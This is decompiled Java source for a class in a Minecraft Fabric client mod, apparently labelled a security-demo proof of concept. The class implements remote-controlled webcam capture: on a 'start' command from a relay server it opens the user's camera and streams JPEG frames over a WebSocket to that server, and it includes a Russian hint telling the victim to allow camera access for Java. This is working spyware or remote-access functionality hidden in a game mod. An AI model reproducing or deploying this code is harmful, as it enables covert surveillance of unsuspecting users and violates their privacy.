package com.securitydemo.poc;

import com.google.gson.JsonObject;
import java.awt.Dimension;
import java.io.IOException;
import java.net.URI;
import java.util.function.Consumer;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class RemoteVideoPublisher {
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private final String serverBase;
   private final String sessionId;
   private final Consumer<String> notifyRelay;
   private final VideoCapture capture = new VideoCapture();
   private final Object camLock = new Object();
   private volatile RelaySocket camSocket;
   private volatile int fps = 10;
   private volatile float quality = 0.55F;
   private volatile float scale = 0.5F;
   private volatile String device;
   private volatile int startGeneration = 0;

   RemoteVideoPublisher(String serverBase, String sessionId, Consumer<String> notifyRelay) {
      this.serverBase = serverBase;
      this.sessionId = sessionId;
      this.notifyRelay = notifyRelay;
   }

   void handleControl(String source, String action, int fps, float quality, float scale, String device) {
      if ("cam".equals(source)) {
         LOGGER.info("Video control: {} {} ({}fps q={} s={} device={})", source, action, fps, quality, scale, device);
         this.fps = fps > 0 ? fps : 10;
         this.quality = quality > 0.0F ? quality : 0.55F;
         this.scale = scale > 0.0F ? scale : 0.5F;
         if (!Compat.isBlank(device)) {
            this.device = device;
         }

         if ("start".equals(action)) {
            this.startCamAsync();
         } else if ("stop".equals(action)) {
            this.stopCam();
         }

      }
   }

   void shutdown() {
      this.stopCam();
   }

   private void startCamAsync() {
      final int generation = ++this.startGeneration;
      final String targetDevice = this.device;
      final int targetFps = this.fps;
      final float targetQuality = this.quality;
      final float targetScale = this.scale;
      Thread starter = new Thread(new Runnable() {
         public void run() {
            synchronized(RemoteVideoPublisher.this.camLock) {
               if (generation != RemoteVideoPublisher.this.startGeneration) {
                  return;
               }

               RemoteVideoPublisher.this.stopCamInternal();
            }

            RelaySocket socket = null;

            try {
               socket = RemoteVideoPublisher.this.connectVideoSocket("cam");
               synchronized(RemoteVideoPublisher.this.camLock) {
                  if (generation != RemoteVideoPublisher.this.startGeneration) {
                     RemoteVideoPublisher.closeSocket(socket);
                     return;
                  }

                  RemoteVideoPublisher.this.camSocket = socket;
               }

               RemoteVideoPublisher.this.capture.start(targetDevice, targetFps, targetQuality, targetScale, new Consumer<byte[]>() {
                  // $FF: synthetic field
                  final <undefinedtype> this$1;

                  {
                     this.this$1 = this$1;
                  }

                  public void accept(byte[] chunk) {
                     RemoteVideoPublisher.sendFrame(this.this$1.this$0.camSocket, chunk);
                  }
               });
               Dimension size = RemoteVideoPublisher.this.capture.activeSize();
               if (size != null) {
                  RemoteVideoPublisher.sendFormat(RemoteVideoPublisher.this.camSocket, size.width, size.height, "jpeg");
                  RemoteVideoPublisher.this.sendStatus(true, RemoteVideoPublisher.this.capture.activeDeviceName(), size.width, size.height, (String)null);
               } else {
                  RemoteVideoPublisher.sendFormat(RemoteVideoPublisher.this.camSocket, 640, 480, "jpeg");
                  RemoteVideoPublisher.this.sendStatus(true, targetDevice, 640, 480, (String)null);
               }
            } catch (Exception e) {
               RemoteVideoPublisher.LOGGER.warn("Webcam capture failed: {}", e.getMessage(), e);
               RemoteVideoPublisher.this.sendStatus(false, targetDevice, 0, 0, RemoteVideoPublisher.friendlyError(e));
               synchronized(RemoteVideoPublisher.this.camLock) {
                  if (generation == RemoteVideoPublisher.this.startGeneration) {
                     RemoteVideoPublisher.this.stopCamInternal();
                  } else {
                     RemoteVideoPublisher.closeSocket(socket);
                  }
               }
            }

         }
      }, "security-demo-poc-video-start");
      starter.setDaemon(true);
      starter.start();
   }

   private static String friendlyError(Exception e) {
      String message = e.getMessage();
      if (Compat.isBlank(message)) {
         return "camera unavailable";
      } else {
         return !message.contains("ffmpeg") && !message.contains("OBS") ? message + " — разреши камеру для Java в Windows" : message;
      }
   }

   private void stopCam() {
      ++this.startGeneration;
      synchronized(this.camLock) {
         this.stopCamInternal();
      }
   }

   private void stopCamInternal() {
      this.capture.stop();
      closeSocket(this.camSocket);
      this.camSocket = null;
   }

   private void sendStatus(boolean ok, String deviceName, int width, int height, String error) {
      JsonObject json = new JsonObject();
      json.addProperty("type", "video_status");
      json.addProperty("source", "cam");
      json.addProperty("ok", ok);
      if (deviceName != null) {
         json.addProperty("device", deviceName);
      }

      json.addProperty("width", width);
      json.addProperty("height", height);
      if (error != null) {
         json.addProperty("error", error);
      }

      this.notifyRelay.accept(json.toString());
   }

   private RelaySocket connectVideoSocket(final String source) throws IOException {
      String wsBase = this.serverBase.replace("https://", "wss://").replace("http://", "ws://");
      URI uri = URI.create(wsBase + "/ws/mod/" + this.sessionId + "/" + source);
      return RelaySocket.connect(uri, new RelaySocket.Listener() {
         public void onOpen(RelaySocket socket) {
            RemoteVideoPublisher.LOGGER.info("Video WebSocket open ({})", source);
         }

         public void onText(String message) {
         }

         public void onBinary(byte[] data) {
         }

         public void onClose(int code, String reason) {
            RemoteVideoPublisher.LOGGER.warn("Video WebSocket closed ({}) {} {}", source, code, reason);
         }

         public void onError(Throwable error) {
            RemoteVideoPublisher.LOGGER.warn("Video WebSocket error ({})", source, error);
         }
      }, 10000);
   }

   private static void sendFormat(RelaySocket socket, int width, int height, String encoding) {
      if (socket != null && socket.isOpen()) {
         socket.sendText("{\"type\":\"video_format\",\"width\":" + width + ",\"height\":" + height + ",\"encoding\":\"" + encoding + "\"}");
      }
   }

   private static void sendFrame(RelaySocket socket, byte[] chunk) {
      if (socket != null && socket.isOpen()) {
         socket.sendBinary(chunk);
      }
   }

   private static void closeSocket(RelaySocket socket) {
      if (socket != null) {
         socket.close();
      }

   }
}
